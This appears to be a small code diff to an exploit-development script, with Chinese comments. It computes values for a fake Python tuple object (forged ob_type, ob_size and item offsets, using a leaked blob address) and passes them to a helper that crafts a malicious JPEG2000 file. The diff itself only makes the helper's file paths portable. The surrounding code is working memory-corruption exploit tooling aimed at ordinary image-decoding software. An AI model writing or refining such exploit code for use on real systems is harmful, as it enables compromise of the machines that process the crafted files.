@@ -39,7 +39,12 @@ print('[i] blob=%#x fake_type=%#x' % (bd, bd + OFF_TYPE), flush=True)
 A_VAL = PY_TUPLE - 0x0c          # 实测: ob_type(+0x08) = A+12 ⇒ A 取 PT-12
 B_VAL = PY_TUPLE                 # 落 ob_size(+0x10)：巨大无害（下标仍合法）
 C_VAL = bd - 4                   # 实测: item2(+0x28) = C+4（e2=4 的偏移）⇒ C 取 bd-4
-r = subprocess.run(['python3', '/tmp/ourpy/mk13.py', '/tmp/exp/base.j2k', OUT,
+_D = os.path.dirname(os.path.abspath(__file__))     # 脚本自己所在目录（放哪都能跑）
+MK13 = os.path.join(_D, 'mk13.py')
+BASE = os.path.join(_D, 'base.j2k')
+if not os.path.exists(BASE):
+    BASE = '/tmp/exp/base.j2k'                      # 兼容旧路径
+r = subprocess.run(['python3', MK13, BASE, OUT,
                     '0', '23', hex(A_VAL), hex(B_VAL), hex(C_VAL), '-370', '4'],
                    capture_output=True, text=True)
 print('[i] build:', (r.stdout + r.stderr).strip()[:120], flush=True)
